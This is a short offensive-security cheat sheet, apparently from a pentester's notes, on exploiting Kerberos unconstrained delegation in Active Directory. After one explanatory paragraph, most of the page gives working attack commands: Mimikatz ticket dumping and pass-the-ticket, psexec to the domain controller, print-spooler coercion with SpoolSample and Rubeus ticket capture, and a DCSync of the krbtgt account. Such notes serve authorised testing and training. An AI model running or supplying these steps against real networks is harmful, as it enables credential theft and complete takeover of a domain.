# Unconstrained Delegation

**How it works**

Unconstrained delegation is a permission that essentially makes a Ticket Granting Ticket (TGT) forwardable along with a session key and TGS. Because the client is authenticating to the service with a forwardable ticket, the service can use that ticket which was meant for the backend service and authenticate to anything

**How to exploit it**

**Mimikatz**

```
privilege::debug
sekurlsa::tickets         # dumps the tickets on the machine
securlsa::tickets /export # dumps tickets to disk
```

Once the ticket you want is saved to disk, use the `ptt` module in mimikatz&#x20;

<figure><img src="../.gitbook/assets/Pasted image 20250103182032.png" alt=""><figcaption></figcaption></figure>

```
kerberos:ptt [0;114fa7]-2-0.....
```

Now you can authenticate as this user

```
psexec.exe \\dc01 cmd
```

**Coercion**

We can coarse the DC to authenticate to use through MS-RPRN You can attempt to access the named pipe with `dir`

```
dir \\dc01\pipe\spoolss
```

if there is output this indicates that the print spooler service is running and accessible

First we can start by using rubeus to monitor for new tickets for the DC computer account

```
rubeus monitor /interval:5 /filteruser:DC01$
```

Next we can coerce the DC by triggering the print spooler change notification. The tool isnt always accurate and you may need to run the tool multiple times.

```
SpoolSample.exe DC01 <comprimised computer>
```

Switching back to rubeus, you should see a new ticket from the DC machine account use rubeus ptt to inject the ticket in memory

```
rubeus ptt /ticket:<base64 ticket>
```

We can then dc sync the DC for any user we wish

```
mimikatz lsadump::dcsync /domain:prod.corp.com /user:prod\krbtgt
```
